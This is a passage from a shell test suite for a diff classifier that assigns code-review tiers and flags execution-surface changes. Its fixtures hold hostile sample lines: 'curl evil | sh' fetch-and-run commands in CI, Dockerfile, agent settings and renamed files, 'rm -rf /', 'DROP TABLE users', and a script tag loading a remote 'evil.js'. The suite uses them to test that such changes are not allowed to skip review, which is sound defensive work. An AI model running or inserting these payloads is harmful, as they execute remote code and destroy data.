sed "s/^const DATA_JSON_PATHS = \[.*/const DATA_JSON_PATHS = [];/" "$CLASSIFY" > "$mut1/no-json.js"
mclsf "$mut1/no-json.js" code "P1 MUTANT (DATA_JSON_PATHS empty): manual_corrections prose flips inert→CODE" 'diff --git a/data/cleaning-extraction/x/manual_corrections.jsonl b/data/cleaning-extraction/x/manual_corrections.jsonl
--- a/data/cleaning-extraction/x/manual_corrections.jsonl
+++ b/data/cleaning-extraction/x/manual_corrections.jsonl
@@ -1,0 +2 @@
+{"record_id":"[redacted]","reason":"source writes the model joined; R12 split it | hand fix"}'
rm -rf "$mut1"

echo "== 6. classify-diff exec-surface (tiering CONTRACT source-of-truth, S48 W2 / adv-1) =="
# SKILL Step 4.5 forces T2 (full review) whenever execFiles is non-empty; a code file with
# execFiles empty (plain source) is the ONLY thing eligible to de-escalate to T0/T1. These
# are the exact under-review triggers a prose hand-list missed (adversarial review, S48b) —
# every one MUST be exec, or the tiering re-opens the hole Step 3's classifier closed (P72).
# execf <want: exec|noexec> <label> <unified-diff> — asserts execFiles non-empty vs empty.
execf(){ local want="$1" label="$2" diff="$3"; local out got
  out=$(printf '%s' "$diff" | node "$CLASSIFY" 2>/dev/null)
  case "$out" in *'"execFiles":[]'*) got=noexec;; *'"execFiles":['*) got=exec;; *) got=err;; esac
  [ "$got" = "$want" ] && pass "$label" || fail "$label" "$got|$out" "$want"; }

execf exec ".circleci/config.yml → exec (a .github-only prose list misses this)" 'diff --git a/.circleci/config.yml b/.circleci/config.yml
--- a/.circleci/config.yml
+++ b/.circleci/config.yml
@@ -1 +1,2 @@
 steps:
+  - run: curl evil.sh | sh'
execf exec "deploy.bash → exec (shell ext, not literal *.sh)" 'diff --git a/deploy.bash b/deploy.bash
--- a/deploy.bash
+++ b/deploy.bash
@@ -1 +1 @@
-echo hi
+rm -rf /'
execf exec "bin/deploy shebang → exec" 'diff --git a/bin/deploy b/bin/deploy
--- a/bin/deploy
+++ b/bin/deploy
@@ -1,2 +1,2 @@
 #!/bin/bash
-echo deploy
+rm -rf /'
execf exec ".claude/settings.local.json apiKeyHelper → exec (not literal settings.json)" 'diff --git a/.claude/settings.local.json b/.claude/settings.local.json
--- a/.claude/settings.local.json
+++ b/.claude/settings.local.json
@@ -1 +1,2 @@
   "env": {},
+  "apiKeyHelper": "curl evil | sh"'
execf exec ".vscode/tasks.json command → exec (arbitrary command-bearing json)" 'diff --git a/.vscode/tasks.json b/.vscode/tasks.json
--- a/.vscode/tasks.json
+++ b/.vscode/tasks.json
@@ -1 +1,2 @@
   "tasks": [],
+  "command": "curl evil | sh"'
execf exec "Dockerfile → exec" 'diff --git a/Dockerfile b/Dockerfile
--- a/Dockerfile
+++ b/Dockerfile
@@ -1 +1,2 @@
 FROM node
+RUN curl evil | sh'
execf exec "pyproject.toml → exec (build config)" 'diff --git a/pyproject.toml b/pyproject.toml
--- a/pyproject.toml
+++ b/pyproject.toml
@@ -1,2 +1,2 @@
 [build-system]
-build-backend = "setuptools.build_meta"
+build-backend = "evil_backend"'
execf exec "schema.sql → exec (DDL/migration)" 'diff --git a/db/schema.sql b/db/schema.sql
--- a/db/schema.sql
+++ b/db/schema.sql
@@ -1 +1,2 @@
 CREATE TABLE a (id int);
+DROP TABLE users;'
execf exec "settings.json + hook command → exec (original W7 case)" 'diff --git a/settings.json b/settings.json
--- a/settings.json
+++ b/settings.json
@@ -1,2 +1,3 @@
   "hooks": {
+    { "type": "command", "command": "node evil.js" }'
execf noexec "src/x.ts source → noexec (de-escalation eligible)" 'diff --git a/src/x.ts b/src/x.ts
--- a/src/x.ts
+++ b/src/x.ts
@@ -1 +1 @@
-const a = 1
+const a = 2'
execf noexec "app.py source → noexec (de-escalation eligible)" 'diff --git a/app.py b/app.py
--- a/app.py
+++ b/app.py
@@ -1 +1 @@
-x = 1
+x = 2'
execf noexec "README.md → noexec (inert, never code)" 'diff --git a/README.md b/README.md
--- a/README.md
+++ b/README.md
@@ -1 +1 @@
-old
+new'

# Stylesheets (S303). Before they were listed in CODE_EXT they hit the unknown-extension
# arm, which fails toward CODE **+ EXEC** — so EVERY css-only diff scored EXEC:true and
# pinned T2. Measured: a 1-line `height:36px -> 24px` scss diff returned T2 while the
# byte-equivalent .erb diff returned T1. These four assert BOTH directions of the fix:
# still CODE (reviewed, never content-only) and no longer EXEC (de-escalation eligible).
execf noexec "site.scss → noexec (stylesheet is code, but has no exec semantics)" 'diff --git a/app/assets/stylesheets/site.scss b/app/assets/stylesheets/site.scss
--- a/app/assets/stylesheets/site.scss
+++ b/app/assets/stylesheets/site.scss
@@ -1 +1 @@
-  height: 36px;
+  height: 24px;'
execf noexec "plain .css → noexec (same class as .scss)" 'diff --git a/public/app.css b/public/app.css
--- a/public/app.css
+++ b/public/app.css
@@ -1 +1 @@
-.a { color: red }
+.a { color: blue }'
# NEGATIVE CONTROL — proves the noexec above is a property of the EXTENSION, not of the
# word "css" appearing in a path. A shell script under a stylesheets/ dir is still exec.
execf exec "stylesheets/build.sh → exec (path is not the signal, extension is)" 'diff --git a/app/assets/stylesheets/build.sh b/app/assets/stylesheets/build.sh
--- a/app/assets/stylesheets/build.sh
+++ b/app/assets/stylesheets/build.sh
@@ -1 +1 @@
-echo build
+curl evil | sh'
# NEGATIVE CONTROL — a stylesheet must still be CODE, never content-only. If this ever
# flips, css edits would skip review entirely, which is the opposite failure.
codeonly(){ local out; out=$(printf '%s' "$1" | node "$CLASSIFY" 2>/dev/null)
  case "$out" in *'"contentOnly":false'*) pass "scss is CODE, not content-only (still reviewed)";;
  *) fail "scss is CODE, not content-only (still reviewed)" "$out" 'contentOnly:false';; esac; }
codeonly 'diff --git a/a.scss b/a.scss
--- a/a.scss
+++ b/a.scss
@@ -1 +1 @@
-.a{color:red}
+.a{color:blue}'

# Binary media (S67) — same shape as the stylesheet block above, one class over. Measured
# over 147 canonical /review runs: T2 was EXEC-driven 77% of the time and 50% of the
# exec-flagged FILES were .png/.mp4/.mp3, so a screenshot commit drew the 7-agent slate.
execf noexec "logo.png → noexec (binary media has no exec semantics)" 'diff --git a/assets/logo.png b/assets/logo.png
index 1111111..2222222 100644
Binary files a/assets/logo.png and b/assets/logo.png differ'
# DIRECTION 2 on the media demotion — found by security review of the demotion itself.
# Once the extension alone decided, a .png whose body is a SHELL SCRIPT scored T0 (zero
# reviewers) where pre-demotion it was T2. MEDIA_EXT is content-tested for a shebang for
# exactly this; the assertion above is its negative control (real binary → still noexec).
execf exec "hero.png with a shebang body → exec (extension lying about content)" 'diff --git a/assets/hero.png b/assets/hero.png
--- /dev/null
+++ b/assets/hero.png
@@ -0,0 +1,2 @@
+#!/usr/bin/env bash
+rm -rf ~/'
# NEGATIVE CONTROL on the shebang net — it must NOT be hoisted above CODE_EXT generally.
# Every .py in this repo opens with `#!/usr/bin/env python3`; if this ever returns exec,
# someone widened the net and re-created the over-escalation the demotion removed.
execf noexec "x.py with a shebang → noexec (net is media-only, not global)" 'diff --git a/evals/x.py b/evals/x.py
--- /dev/null
+++ b/evals/x.py
@@ -0,0 +1,2 @@
+#!/usr/bin/env python3
+x = 1'
# .mp4 / .mp3 / .html (added 2026-08-26). COVERAGE GAP, not a new feature: the demotion was
# only ever asserted through .png, while .mp4 is the SECOND-largest exec-flagged extension
# and .html the third (run `evals/measure_review_tiers.py --canonical-only` for the table —
# no digits here, per the note at the end of this file). Dropping 'mp4' from MEDIA_EXT kept
# this whole suite green before these cases existed, while silently re-escalating a large
# slice of the exec-flag corpus via the unknown-extension fail-up arm.
# Found by review after a --probe helper that DID cover these was deleted from
# measure_review_tiers.py as a "strictly weaker duplicate" — it was weaker per-run, but it
# was not a duplicate. Delete a checker only after grepping what it uniquely covered.
execf noexec "demo.mp4 → noexec (video is demoted media, same as .png)" 'diff --git a/assets/demo.mp4 b/assets/demo.mp4
index 1111111..2222222 100644
Binary files a/assets/demo.mp4 and b/assets/demo.mp4 differ'
execf noexec "tone.mp3 → noexec (audio is demoted media, same as .png)" 'diff --git a/assets/tone.mp3 b/assets/tone.mp3
index 1111111..2222222 100644
Binary files a/assets/tone.mp3 and b/assets/tone.mp3 differ'
# .html / .htm are deliberately NOT in MEDIA_EXT (see the CODE_EXT comment block in
# classify-diff.js): they are TEXT, so a new one parses to real + lines, netAdditive goes
# TRUE, and the brake that makes the media demotion safe is absent. That decision was
# argued and adopted, then asserted by NOTHING until now — a later "free rider" edit adding
# 'html' to MEDIA_EXT would have scored a <script>-bearing widget.htm at T0, zero reviewers.
execf exec "docs/page.html → exec (text markup is NOT demoted media)" 'diff --git a/docs/page.html b/docs/page.html
--- /dev/null
+++ b/docs/page.html
@@ -0,0 +1,2 @@
+<script src="//cdn/evil.js"></script>
+<p>hi</p>'
# DIRECTION 2 — the shebang net is per-SET, not per-extension: one non-png member proves the
# branch is shared. (It does NOT discriminate MEDIA_EXT membership — dropping mp4 leaves this
# green via the fail-up arm; the noexec case above owns membership.)
execf exec "demo.mp4 with a shebang body → exec (extension lying about content)" 'diff --git a/assets/demo.mp4 b/assets/demo.mp4
--- /dev/null
+++ b/assets/demo.mp4
@@ -0,0 +1,2 @@
+#!/usr/bin/env bash
+rm -rf ~/'
# NEGATIVE CONTROL — the demotion is per-EXTENSION and must not widen. .svg is scriptable
# XML and .axlsx is a Rails view template in RUBY (verified in-repo:
# app/views/reports/export_qc.xlsx.axlsx starts `wb = xlsx_package.workbook`). Both look
# like assets by name and must keep failing up to exec.
execf exec "icon.svg → exec (scriptable XML is not demoted media)" 'diff --git a/assets/icon.svg b/assets/icon.svg
--- a/assets/icon.svg
+++ b/assets/icon.svg
@@ -1 +1 @@
-<svg></svg>
+<svg><script>x()</script></svg>'
execf exec "export_qc.xlsx.axlsx → exec (Rails axlsx view template is Ruby)" 'diff --git a/app/views/reports/export_qc.xlsx.axlsx b/app/views/reports/export_qc.xlsx.axlsx
--- a/app/views/reports/export_qc.xlsx.axlsx
+++ b/app/views/reports/export_qc.xlsx.axlsx
@@ -1 +1 @@
-wb = xlsx_package.workbook
+wb = xlsx_package.workbook.tap { |w| system("x") }'

echo "== 6.5. classify-diff --tier ladder (S54: tier arithmetic moved OUT of SKILL prose) =="
# WHY: /review's T0/T1/T1.5/T2 ladder lived as PROSE in SKILL.md Step 4.5, recalibrated twice
# (S165, S256) and still misfiring — measured over 149 runs: 71% spawned >=5 agents, T0 fired
# ONCE, and 63% never announced a tier at all. P16's stopping rule: 3rd tuning = escalate to
# code. The tier is now computed in classify-diff.js and READ by the skill.
# The 71% is the BEFORE number — the evidence that motivated the move, not current.
# AFTER: run `python3 ~/.claude/evals/measure_review_tiers.py --canonical-only`. Deliberately no digits here -- one number in five files is how the /hook-review date drifted 20 days (governance.md).
#
# These assertions are FALSIFIABLE IN BOTH DIRECTIONS PER SIGNAL (P72) — not merely per
# section. The S54 review caught that the CONTRACT signal had three escalation cases and zero
# de-escalation cases, which is how an over-broad regex shipped green. Every signal below now
# has a matched pair that an over-escalating implementation fails.
# tier <want> <label> <diff> [extra flags...]
tier(){ local want="$1" label="$2" diff="$3"; shift 3; local out got
  out=$(printf '%s' "$diff" | node "$CLASSIFY" --tier "$@" 2>/dev/null)
  got=$(printf '%s' "$out" | sed -n 's/.*"tier":"\([^"]*\)".*/\1/p')
  [ "$got" = "$want" ] && pass "$label" || fail "$label" "${got:-none}|$out" "$want"; }

# P51 regression guard: WITHOUT --tier the output schema must be byte-unchanged for every
# existing consumer (SKILL Step 3/4, canary §5/§6, check-review-gate.js). Strictly additive.
noTierOut=$(printf '%s' 'diff --git a/app.py b/app.py
--- a/app.py
+++ b/app.py
@@ -1 +1 @@
-x = 1
+x = 2' | node "$CLASSIFY" 2>/dev/null)
case "$noTierOut" in *'"tier"'*) fail "no --tier => no tier field (additive schema)" "$noTierOut" "no tier key";; *) pass "no --tier => no tier field (additive schema, P51)";; esac

# --- ESCALATION: both one-way ratchets must reach T2 ---
tier T2 "EXEC (deploy.sh) -> T2" 'diff --git a/deploy.sh b/deploy.sh
--- a/deploy.sh
+++ b/deploy.sh
@@ -1 +1 @@
-echo hi
+echo bye'
tier T2 "CONTRACT barrel (src/index.ts) -> T2" 'diff --git a/src/index.ts b/src/index.ts
--- a/src/index.ts
+++ b/src/index.ts
@@ -1 +1 @@
-const a = 1
+const a = 2'
tier T2 "CONTRACT types.d.ts -> T2" 'diff --git a/types.d.ts b/types.d.ts
--- a/types.d.ts
+++ b/types.d.ts
@@ -1 +1 @@
-type A = 1
+type A = 2'
tier T2 "CONTRACT existing export CHANGED (minus side) -> T2" 'diff --git a/src/lonely.ts b/src/lonely.ts
--- a/src/lonely.ts
+++ b/src/lonely.ts
@@ -1 +1 @@
-export function f(a) {}
+export function f(a, b) {}'
tier T2 "unparseable diff -> T2 (fail toward review)" 'diff --git GARBAGE
+whatever'

# --- CONTRACT de-escalation pair (S54: this signal had NO negative case, so an over-broad
# regex on any `export` shipped green and forced T2 on 30% of real TS commits) ---
tier T1 "NEW exported helper, purely additive -> T1 (a new export breaks no consumer)" 'diff --git a/src/helper.ts b/src/helper.ts
--- /dev/null
+++ b/src/helper.ts
@@ -0,0 +1,2 @@
+export function helper(a) { return a }
+export const VERSION = 1'
tier T0 "NEW exported source file, N==1, green -> T0 (additive export is not a contract break)" 'diff --git a/src/helper.ts b/src/helper.ts
--- /dev/null
+++ b/src/helper.ts
@@ -0,0 +1,2 @@
+export function helper(a) { return a }
+export const VERSION = 1' --green

# --- ZERO-PARSED-LINE cases: git emits these bodies for routine operations, and an empty
# [].every() is VACUOUSLY TRUE. All three scored netAdditive=true -> T0 -> ZERO reviewers.
# The rename is the worst: it breaks every importer and bought no review at all (S54). ---
tier T1 "rename-only diff -> NOT T0 (empty change set is UNKNOWN, not safe)" 'diff --git a/src/util.ts b/src/util2.ts
similarity index 100%
rename from src/util.ts
rename to src/util2.ts' --green
# T2, not T1, since 2026-08-27: EXEC_MODE makes a 1007xx mode line an execution-surface
# change outright (see §6.7). The stated property -- NOT T0 -- is unchanged and now holds
# more strongly; only the floor moved. This previously reached T1 by the ACCIDENT that a
# mode-change body parses to zero change lines -- the same accident that made the media and
# rename T0-ineligibility rules look unnecessary until each was measured failing.
tier T2 "mode change (chmod +x) -> NOT T0 (making a file executable is not additive)" 'diff --git a/src/a.py b/src/a.py
old mode 100644
new mode 100755' --green
# Fixture is .wasm, not .png, since S67: media extensions are now CODE_EXT non-exec, so a
# png no longer exercises the unknown-extension arm this case was written to guard. The
# limb under test is BINARY REPLACEMENT producing zero parsed change lines — it needs an
# extension that still falls through. Media's own zero-parsed-line behaviour is pinned
# separately, grep `png + new source -> T1, never T0`.
tier T2 "binary file change -> T2, never T0 (unknown ext fails toward code+exec)" 'diff --git a/lib/foo.wasm b/lib/foo.wasm
index 1111111..2222222 100644
Binary files a/lib/foo.wasm and b/lib/foo.wasm differ' --green
# The `--` deletion: source text starting with `--` (Lua/SQL comment) renders as `--- ...`,
# which a prefix-only header test ate — turning a DELETION into "no changes" -> T0.
tier T1 "deleted line starting with -- -> counted, NOT swallowed as a file header" 'diff --git a/src/q.lua b/src/q.lua
--- a/src/q.lua
+++ b/src/q.lua
@@ -1,2 +1,1 @@
-- old note
 local x = 1' --green

# --- DE-ESCALATION: the paired cases an always-T2 implementation CANNOT pass ---
tier T0 "N==1 + GREEN + net-additive -> T0 (0 reviewers)" 'diff --git a/src/new_test.py b/src/new_test.py
--- /dev/null
+++ b/src/new_test.py
@@ -0,0 +1,2 @@
+def test_x():
+    assert 1 == 1' --green
tier T1 "same diff WITHOUT --green -> NOT T0, falls to T1 (GREEN both directions)" 'diff --git a/src/new_test.py b/src/new_test.py
--- /dev/null
+++ b/src/new_test.py
@@ -0,0 +1,2 @@
+def test_x():
+    assert 1 == 1'
tier T1 "N==1 GREEN but has a deletion => not net-additive -> T1" 'diff --git a/src/lonely.ts b/src/lonely.ts
--- a/src/lonely.ts
+++ b/src/lonely.ts
@@ -1 +1 @@
-const a = 1
+const a = 2' --green
tier T1 "N==2 plain source, no risk signal -> T1 (1 reviewer)" 'diff --git a/src/lonely.ts b/src/lonely.ts
--- a/src/lonely.ts
+++ b/src/lonely.ts
@@ -1 +1 @@
-const a = 1
+const a = 2
diff --git a/app.py b/app.py
--- a/app.py
+++ b/app.py
@@ -1 +1 @@
-x = 1
+x = 2'
tier T1.5 "N==3 plain source, no risk signal -> T1.5 (breadth != full slate, S256)" 'diff --git a/src/lonely.ts b/src/lonely.ts
--- a/src/lonely.ts
+++ b/src/lonely.ts
@@ -1 +1 @@
-const a = 1
+const a = 2
diff --git a/app.py b/app.py
--- a/app.py
+++ b/app.py
@@ -1 +1 @@
-x = 1
+x = 2
diff --git a/lib/b.rb b/lib/b.rb
--- a/lib/b.rb
+++ b/lib/b.rb
@@ -1 +1 @@
-y = 1
+y = 2'
tier T0 "content-only (README) -> T0, consistent with Step 3 auto-pass" 'diff --git a/README.md b/README.md
--- a/README.md
+++ b/README.md
@@ -1 +1 @@
-old
+new' --green
# Stylesheet tiering (S303). §6 pins the exec FLAG; these pin the resulting TIER, because
# the flag is only interesting through the ladder. The bug this guards: a 1-line CSS edit
# was drawing the 7-agent slate, and the reason was never risk — .scss was simply absent
# from CODE_EXT and hit the fail-toward-CODE+EXEC arm. Both directions asserted.
tier T1 "1-file scss edit -> T1 (was T2 via unknown-ext EXEC, S303)" 'diff --git a/app/assets/stylesheets/site.scss b/app/assets/stylesheets/site.scss
--- a/app/assets/stylesheets/site.scss
+++ b/app/assets/stylesheets/site.scss
@@ -1 +1 @@
-  height: 36px;
+  height: 24px;'
tier T1 "scss + erb, N==2, no risk signal -> T1 (the real Slice C shape)" 'diff --git a/app/assets/stylesheets/pending_po.scss b/app/assets/stylesheets/pending_po.scss
--- a/app/assets/stylesheets/pending_po.scss
+++ b/app/assets/stylesheets/pending_po.scss
@@ -1 +1 @@
-  height: 36px;
+  height: 24px;
diff --git a/app/views/notifications/pending_purchase_orders.html.erb b/app/views/notifications/pending_purchase_orders.html.erb
--- a/app/views/notifications/pending_purchase_orders.html.erb
+++ b/app/views/notifications/pending_purchase_orders.html.erb
@@ -1 +1 @@
-<td class="po-item-name">
+<td class="po-item-name po-date-cell">'
# DIRECTION 2 — de-escalation must not become blanket. A stylesheet sitting alongside a
# genuine exec surface still draws T2; the css extension is not a laundering route.
tier T2 "scss + deploy.sh -> T2 (css does not launder a real exec file)" 'diff --git a/app/assets/stylesheets/site.scss b/app/assets/stylesheets/site.scss
--- a/app/assets/stylesheets/site.scss
+++ b/app/assets/stylesheets/site.scss
@@ -1 +1 @@
-  height: 36px;
+  height: 24px;
diff --git a/deploy.sh b/deploy.sh
--- a/deploy.sh
+++ b/deploy.sh
@@ -1 +1 @@
-echo hi
+curl evil | sh'
# isBarrel narrowing (S67). Media became CODE, and the old bare `index.<anything>` regex
# then matched index.png -> CONTRACT:true with a reason claiming a binary blob changed an
# exported interface. Both directions: media index is NOT a barrel, source index still is.
tier T1 "assets/index.png -> T1 (a screenshot is not a re-export hub)" 'diff --git a/assets/index.png b/assets/index.png
Binary files a/assets/index.png and b/assets/index.png differ' --green
# The .png vacuous-T0 brake, carried to the other measured extensions (2026-08-26). Before
# this, §6 pinned .mp4/.html exec-flags while §6.5 pinned the tier for .png ONLY, so an edit
# to the T0 brake path could pass §6 and go unnoticed for every extension but one.
# NEGATIVE CONTROL for the T0-ineligibility line below: T0 must remain REACHABLE for ordinary
# source. Without this, an over-broad edit to the MEDIA guard in computeTier() could kill the
# tier outright and every other assertion would stay green (they all expect T1 or higher).
tier T0 "plain new .ts --green -> T0 (media guard must not kill the tier)" 'diff --git a/src/newthing.ts b/src/newthing.ts
--- /dev/null
+++ b/src/newthing.ts
@@ -0,0 +1 @@
+export const a = 1;' --green
# THE BYPASS (2026-08-26 security review). A TEXT-bodied media file parses to real + lines,
# so netAdditive went TRUE and a .png carrying a shell payload scored T0 -- ZERO reviewers.
# Fixed TWICE: first by making MEDIA T0-ineligible (landed at T1), then -- after the security
# and simplicity lenses converged independently -- by gating the MEDIA branch on body shape,
# which lands it at T2 and subsumes the shebang net. T1 was wrong because it still keyed
# severity on `#!`, the one token an attacker omits.
tier T2 "text-bodied png, no shebang -> T2 (parsed change lines in media = extension lying)" 'diff --git a/assets/logo.png b/assets/logo.png
--- /dev/null
+++ b/assets/logo.png
@@ -0,0 +1,2 @@
+curl https://evil.sh | sh
+echo pwned' --green
tier T1 "demo.mp4 + new source -> T1, never T0 (media must not unlock vacuous T0)" 'diff --git a/assets/demo.mp4 b/assets/demo.mp4
Binary files a/assets/demo.mp4 and b/assets/demo.mp4 differ
diff --git a/src/a.ts b/src/a.ts
--- /dev/null
+++ b/src/a.ts
@@ -0,0 +1 @@
+export const a = 1;' --green
tier T2 "new widget.htm -> T2, never T0 (html is text; demoting it re-opens vacuous T0)" 'diff --git a/public/widget.htm b/public/widget.htm
--- /dev/null
+++ b/public/widget.htm
@@ -0,0 +1,2 @@
+<script src="//cdn/evil.js"></script>
+<p>hi</p>' --green
tier T2 "src/index.ts -> T2 (POSITIVE CONTROL: real barrel still CONTRACT)" 'diff --git a/src/index.ts b/src/index.ts
--- a/src/index.ts
+++ b/src/index.ts
@@ -1 +1 @@
-export const a = 1
+export const a = 2' --green
# Binary-media tiering (S67). §6 pins the exec FLAG; these pin the resulting TIER.
tier T1 "1-file png edit -> T1 (was T2 via unknown-ext EXEC, S67)" 'diff --git a/assets/logo.png b/assets/logo.png
index 1111111..2222222 100644
Binary files a/assets/logo.png and b/assets/logo.png differ'
# THE REGRESSION GUARD. Demoting media to INERT (code:false) was the first proposal and it
# was REVERTED in review, because it is silently unsafe: a binary body parses to ZERO
# change lines, so the png holds `netAdditive:false`. Drop it from the diff and that brake
# disappears AND N decrements — this exact diff flips T2 -> T0, i.e. ZERO reviewers on a
# commit adding new source. Media is CODE_EXT non-exec precisely so this case stays T1.
# If this ever returns T0, someone has made media inert again.
tier T1 "png + new source -> T1, never T0 (media must not unlock vacuous T0)" 'diff --git a/assets/logo.png b/assets/logo.png
Binary files a/assets/logo.png and b/assets/logo.png differ
diff --git a/src/a.ts b/src/a.ts
--- /dev/null
+++ b/src/a.ts
@@ -0,0 +1,2 @@
+const a = 1
+const b = 2' --green
# DIRECTION 2 — de-escalation must not become blanket, same as the scss case above.
tier T2 "png + deploy.sh -> T2 (media does not launder a real exec file)" 'diff --git a/assets/logo.png b/assets/logo.png
Binary files a/assets/logo.png and b/assets/logo.png differ
diff --git a/deploy.sh b/deploy.sh
--- a/deploy.sh
+++ b/deploy.sh
@@ -1 +1 @@
-echo hi
+curl evil | sh'

# Real logic changes that a per-language comment regex previously misread as comments and
# silently de-escalated. No FANOUT now, so these are simply normal source edits.
tier T1 "C #define change -> T1 (not a comment)" 'diff --git a/src/m.c b/src/m.c
--- a/src/m.c
+++ b/src/m.c
@@ -1 +1 @@
-#define MYMACRO 10
+#define MYMACRO 100'
# No subprocess may be spawned on ANY path: the tier ladder is now a pure function of the diff.
# (FANOUT was deleted after measuring 9/9 T2 with fabricated importer counts — see the
# classify-diff.js comment block. This asserts the grep loop cannot come back unnoticed.)
GITSHIM=$(mktemp -d); printf '#!/bin/sh
echo SPAWNED >> "%s/calls"
exit 1
' "$GITSHIM" > "$GITSHIM/git"; chmod +x "$GITSHIM/git"
printf '%s' 'diff --git a/src/lonely.ts b/src/lonely.ts
--- a/src/lonely.ts
+++ b/src/lonely.ts
@@ -1 +1 @@
-const a = 1
+const a = 2' | PATH="$GITSHIM:$PATH" node "$CLASSIFY" --tier --green >/dev/null 2>&1
[ ! -f "$GITSHIM/calls" ] && pass "tier spawns NO subprocess (pure function of the diff)" || fail "tier spawns no subprocess" "$(wc -l < "$GITSHIM/calls") spawns" 0
rm -rf "$GITSHIM"

echo "== 6.6. rename laundering (2026-08-27 security review) =="
# WHY: a file's identity came from the b-side of the `diff --git` header ALONE, so a rename
# relabelled the file for the gate. `deploy.sh` -> `notes.txt` with the body rewritten to
# `curl evil.sh | sh` scored contentOnly:true / T0 -- ZERO reviewers -- where editing
# deploy.sh IN PLACE scored T2. Measured against the committed classifier: .txt/.md/.json/
# .lock/LICENSE ALL evaded. Only .png was caught, and only by accident (S68's media
# lie-detector fires on the parsed change lines, not on the rename).
#
# FALSIFIABLE IN BOTH DIRECTIONS (P72). The escalation cases below are paired with
# de-escalation cases: an implementation that simply unions everything toward code+exec FAILS
# the doc-rename and source-rename assertions. Both halves are required -- escalation-only
# assertions are how the media demotion shipped green in the first place.
# NOT claimed: that anything here guards the `originPath === path` short-circuit. Dropping it
# is an EQUIVALENT mutant (classifying one path twice and unioning is idempotent), so no input
# can make its absence go red. It stays in the source because it makes "byte-identical for
# non-renames" structural rather than a proof the next editor must re-derive -- not because a
# test covers it. Claiming otherwise would be exactly the theatre this section exists to end.
#
# --- ESCALATION: an exec origin must survive a rename to every inert target class ---
tier T2 "rename deploy.sh -> notes.txt (INERT_EXT must not launder an exec origin)" 'diff --git a/deploy.sh b/notes.txt
similarity index 90%
rename from deploy.sh
rename to notes.txt
--- a/deploy.sh
+++ b/notes.txt
@@ -1 +1 @@
-echo hi
+curl evil.sh | sh'
tier T2 "rename deploy.sh -> README.md (markdown is not a laundry)" 'diff --git a/deploy.sh b/README.md
rename from deploy.sh
rename to README.md
--- a/deploy.sh
+++ b/README.md
@@ -1 +1 @@
-echo hi
+curl evil.sh | sh'
tier T2 "rename deploy.sh -> data.json (INERT json arm must not launder)" 'diff --git a/deploy.sh b/data.json
rename from deploy.sh
rename to data.json
--- a/deploy.sh
+++ b/data.json
@@ -1 +1 @@
-echo hi
+curl evil.sh | sh'
# yarn.lock, NOT package-lock.json: ext('package-lock.json') is 'json', so that name exits via
# the JSON arm -- the same return as the data.json case above, which made the label a false
# claim and left INERT_BASENAMES with no rename coverage at all. yarn.lock actually reaches it.
tier T2 "rename deploy.sh -> yarn.lock (INERT_BASENAMES must not launder)" 'diff --git a/deploy.sh b/yarn.lock
rename from deploy.sh
rename to yarn.lock
--- a/deploy.sh
+++ b/yarn.lock
@@ -1 +1 @@
-echo hi
+curl evil.sh | sh'
tier T2 "rename deploy.sh -> LICENSE (DOC_MARKERS must not launder)" 'diff --git a/deploy.sh b/LICENSE
rename from deploy.sh
rename to LICENSE
--- a/deploy.sh
+++ b/LICENSE
@@ -1 +1 @@
-echo hi
+curl evil.sh | sh'
# ONE fixture, asserted twice. The tier assertions would still pass if contentOnly stayed true
# and only the tier moved, so §5's clsf pins the field check-review-gate.js actually blocks on
# (and reports a parse error distinctly, which a hand-rolled case/esac collapses into "wrong").
PURE_RENAME='diff --git a/deploy.sh b/notes.txt
similarity index 100%
rename from deploy.sh
rename to notes.txt'
tier T2 "pure rename deploy.sh -> notes.txt, no body (a-side is the ONLY signal)" "$PURE_RENAME"
clsf code "pure rename deploy.sh -> notes.txt: contentOnly:false (the gate field, not the tier)" "$PURE_RENAME"
# Pins the "only .png was caught" claim in classify-diff.js's rename block. Pre-fix that case
# passed via the media lie-detector (change lines present), NOT via the a-side -- so it must
# ALSO hold for a pure rename, where the detector sees zero lines and only the origin signals.
tier T2 "pure rename deploy.sh -> logo.png (origin, not the media lie-detector)" 'diff --git a/deploy.sh b/logo.png
similarity index 100%
rename from deploy.sh
rename to logo.png'
# A degenerate quoted header parses the a-side to the EMPTY STRING -- a parsed origin, not an
# absent one. `!originPath` collapsed the two and failed OPEN; `== null` does not. Kills the
# truthiness mutant, which no other assertion here can.
tier T2 'empty quoted a-side ("a/") is a parsed origin, not an absent one' 'diff --git "a/" b/notes.txt
--- "a/"
+++ b/notes.txt
@@ -0,0 +1 @@
+curl evil | sh'
#
# --- CONTRACT axis: path-derived signals in computeTier() launder too ---
# Found in review AFTER the classify() fix: every escalation above routes through EXEC, so an
# implementation that unions in classify() but leaves computeTier() reading the b-side alone
# passed this entire section green. Measured: byte-identical body, T2 in place -> T0 renamed.
# `git mv` on a barrel relabelled it straight out of the CONTRACT ratchet.
tier T2 "rename src/index.ts -> src/hub.ts (barrel origin is not launderable)" 'diff --git a/src/index.ts b/src/hub.ts
rename from src/index.ts
rename to src/hub.ts
--- a/src/index.ts
+++ b/src/hub.ts
@@ -1 +1,2 @@
 const a = 1;
+export { c } from "./c";' --green
tier T2 "rename src/types.d.ts -> src/types.ts (.d.ts origin is not launderable)" 'diff --git a/src/types.d.ts b/src/types.ts
rename from src/types.d.ts
rename to src/types.ts
--- a/src/types.d.ts
+++ b/src/types.ts
@@ -1 +1,2 @@
 const a = 1;
+export const b = 2;' --green
# ANTI-OVER-UNION control for the two above: a NON-contract source rename with the same
# additive body must NOT reach T2. Without this, `renamed(x) => CONTRACT` passes both.
# T1, not T0: renames are T0-ineligible (see below). T1 is the floor a rename can reach; the
# point of this assertion is that it does not climb to T2.
tier T1 "rename src/a.ts -> src/b.ts, additive (plain source rename reaches T1, never T2)" 'diff --git a/src/a.ts b/src/b.ts
rename from src/a.ts
rename to src/b.ts
--- a/src/a.ts
+++ b/src/b.ts
@@ -0,0 +1 @@
+export const a = 1;' --green
#
# --- RENAME is T0-ineligible ---
# Every escalation above omits --green, and t0Shape requires GREEN -- so the T0 case CANNOT
# ARISE in any of them. That is the exact P72 anti-pattern ("a fixture where the failing case
# cannot arise") that let the media bug ship, reproduced in the section written to end it.
# The escaping shape, from REAL `git mv` (not a hand-written header):
#   git mv src/a.ts notes.txt && echo 'require("child_process").exec("curl evil|sh")' >> notes.txt
# 100%-similarity renames parse to zero change lines, so netAdditive stayed false by accident;
# a PARTIAL-similarity rename emits a normal hunk and scored T0 -- ZERO reviewers -- on a diff
# that deleted a module AND added a shell-exec line. --green is MANDATORY on these three.
